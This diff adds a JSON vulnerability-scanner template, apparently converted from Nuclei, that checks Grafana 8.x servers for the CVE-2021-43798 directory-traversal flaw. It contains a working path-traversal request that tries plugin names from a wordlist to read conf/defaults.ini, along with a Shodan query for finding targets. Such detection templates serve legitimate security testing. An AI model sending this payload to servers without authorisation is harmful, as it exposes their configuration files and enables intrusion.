@@ -1,0 +1,167 @@
+{
+  "id": "grafana-file-read",
+  "name": "Grafana 8.x - Local File Inclusion",
+  "author": "z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0,j4vaovo",
+  "severity": "HIGH",
+  "description": "Grafana 8.x is vulnerable to local file inclusion.",
+  "references": [
+    "https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/",
+    "https://nosec.org/home/detail/4914.html",
+    "https://github.com/jas502n/Grafana-VulnTips",
+    "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p",
+    "https://twitter.com/naglinagli/status/1468155313182416899",
+    "https://nvd.nist.gov/vuln/detail/CVE-2021-43798"
+  ],
+  "tags": [
+    "grafana",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "title:\"Grafana\""
+  },
+  "variables": {
+    "pluginSlug": [
+      "helpers/wordlists/grafana-plugins.txt"
+    ]
+  },
+  "variablesType": "sniper",
+  "cveId": "CVE-2021-43798",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "socket \u003d /tmp/grafana.sock",
+            "http_port"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 50,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "grafana-file-read",
+    "info": {
+      "name": "Grafana 8.x - Local File Inclusion",
+      "author": "z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0,j4vaovo",
+      "severity": "high",
+      "description": "Grafana 8.x is vulnerable to local file inclusion.",
+      "reference": [
+        "https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/",
+        "https://nosec.org/home/detail/4914.html",
+        "https://github.com/jas502n/Grafana-VulnTips",
+        "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p",
+        "https://twitter.com/naglinagli/status/1468155313182416899",
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-43798"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cve_id": "CVE-2021-43798",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 325,
+        "shodan_query": "title:\"Grafana\""
+      },
+      "tags": "grafana,lfi"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "pluginSlug": "helpers/wordlists/grafana-plugins.txt"
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 50,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "socket \u003d /tmp/grafana.sock",
+              "http_port"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
